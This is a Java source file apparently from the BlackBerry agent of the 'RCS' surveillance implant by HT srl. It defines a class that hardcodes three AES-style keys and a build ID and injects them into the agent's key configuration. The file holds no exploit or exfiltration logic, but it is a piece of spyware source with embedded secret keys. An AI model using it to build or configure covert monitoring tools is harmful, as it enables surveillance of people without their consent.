//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.config;

// TODO: Auto-generated Javadoc
/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeys323 implements InstanceKeysEmbedded {
    //#ifdef FAKE323
    // RCS 323
    public byte[] logKey = new byte[] { (byte) 0x2b, (byte) 0xb8, (byte) 0x0b,
            (byte) 0xc9, (byte) 0x61, (byte) 0x0a, (byte) 0x0a, (byte) 0x7b,
            (byte) 0x6c, (byte) 0x9c, (byte) 0x10, (byte) 0x06, (byte) 0x85,
            (byte) 0x3d, (byte) 0x80, (byte) 0x72 };
    public byte[] confKey = new byte[] { (byte) 0xdc, (byte) 0xaa, (byte) 0x14,
            (byte) 0xa8, (byte) 0xdd, (byte) 0xe6, (byte) 0x94, (byte) 0x69,
            (byte) 0x38, (byte) 0x25, (byte) 0x88, (byte) 0x45, (byte) 0x32,
            (byte) 0xb2, (byte) 0x4a, (byte) 0x1a };
    public byte[] protoKey = new byte[] { (byte) 0xb0, (byte) 0xf4,
            (byte) 0x45, (byte) 0x16, (byte) 0xd1, (byte) 0x30, (byte) 0xd0,
            (byte) 0xa5, (byte) 0x51, (byte) 0x30, (byte) 0xdb, (byte) 0x9b,
            (byte) 0xac, (byte) 0x6f, (byte) 0xd5, (byte) 0xfb };

    /**
     * Inject keys323.
     */
    public void injectKeys(InstanceKeys keys) {
        keys.setAesKey(logKey);
        keys.setChallengeKey(protoKey);
        keys.setBuildID("RCS_0000000323");
        keys.setConfKey(confKey);
    }

    public InstanceKeys323() {
    };

    //#else
    public void injectKeys(InstanceKeys keys) {
    };
    //#endif
}
